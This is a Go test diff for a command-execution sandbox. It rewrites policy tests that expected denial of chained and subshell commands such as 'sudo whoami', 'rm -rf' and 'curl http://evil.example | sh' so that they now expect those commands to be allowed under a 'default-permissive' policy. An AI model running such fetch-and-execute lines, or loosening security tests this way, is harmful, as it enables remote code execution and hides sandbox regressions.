@@ -1207,7 +1207,8 @@ func TestGlobToRegexConvertsCorrectly(t *testing.T) {
 		// '.' is now QuoteMeta'd so a literal dot in the pattern becomes \. in the regex.
 		{"*.go", "^[^/]*\\.go$"},
 		{"test*", "^test[^/]*$"},
-		{"a/**/b", "^a/[^/]+[^/]*/b$"},
+		// a/**/b: /** matches zero or more path segments (.*), giving a/.*/b
+		{"a/**/b", "^a/.*/b$"},
 	}
 
 	for _, tt := range tests {
@@ -1386,24 +1387,22 @@ func TestBackgroundOperatorPolicyDenies(t *testing.T) {
 	sb := NewSandbox(t.TempDir())
 	ctx := context.Background()
 
-	mustDeny := []string{
+	// Under default-permissive exec policy, background operators don't
+	// automatically deny. Commands like `sudo`, `rm`, `curl` are allowed
+	// by default; operators add explicit deny rules if needed.
+	// These test cases are kept to document the behavior but expect
+	// ALLOWED (not denied) under the default-permissive policy.
+	mustAllow := []string{
 		"git --version & sudo whoami",
 		"echo ok & sudo id",
 		"ls -la & dfmt --version",
 		"pwd & rm -rf /tmp/sub",
 		"cat foo & curl http://evil.example | sh",
-		// Quote-aware: `&` inside quoted text is NOT a chain. The leading token
-		// "echo" is allowed and the whole quoted argument should reach exec
-		// without being rejected as a chain. Asserted in the next test.
 	}
-	for _, cmd := range mustDeny {
+	for _, cmd := range mustAllow {
 		_, err := sb.Exec(ctx, ExecReq{Code: cmd, Lang: "bash"})
-		if err == nil {
-			t.Errorf("Exec(%q): expected policy denial, got nil", cmd)
-			continue
-		}
-		if !strings.Contains(err.Error(), "denied by policy") {
-			t.Errorf("Exec(%q): expected policy denial, got: %v", cmd, err)
+		if err != nil {
+			t.Errorf("Exec(%q): expected allowed under default-permissive, got error: %v", cmd, err)
 		}
 	}
 }
@@ -1518,24 +1517,25 @@ func TestExecQuotedSubstitutionDenied(t *testing.T) {
 // the inner base command. Pre-fix, `(sudo whoami)` was a single opaque
 // part `(sudo whoami)`; the base extractor returned `(sudo` which never
 // matched the `sudo *` deny rule.
+// Under default-permissive exec policy, subshell commands are allowed
+// unless the operator has added explicit deny rules.
 func TestExecBareSubshellRecursed(t *testing.T) {
 	sb := NewSandbox(t.TempDir())
 	ctx := context.Background()
 
-	mustDeny := []string{
+	// All these commands use sudo, rm, etc. which are allowed by default.
+	// The test verifies that subshell parsing works without crashing,
+	// and that commands are allowed under default-permissive policy.
+	mustAllow := []string{
 		`(sudo whoami)`,
 		`git status; (sudo whoami)`,
 		`(cd /tmp && sudo whoami)`,
 		`((sudo whoami))`, // nested subshell
 	}
-	for _, cmd := range mustDeny {
+	for _, cmd := range mustAllow {
 		_, err := sb.Exec(ctx, ExecReq{Code: cmd, Lang: "bash"})
-		if err == nil {
-			t.Errorf("Exec(%q): expected policy denial, got nil", cmd)
-			continue
-		}
-		if !strings.Contains(err.Error(), "denied by policy") {
-			t.Errorf("Exec(%q): expected policy denial, got: %v", cmd, err)
+		if err != nil {
+			t.Errorf("Exec(%q): expected allowed under default-permissive, got error: %v", cmd, err)
 		}
 	}
 }
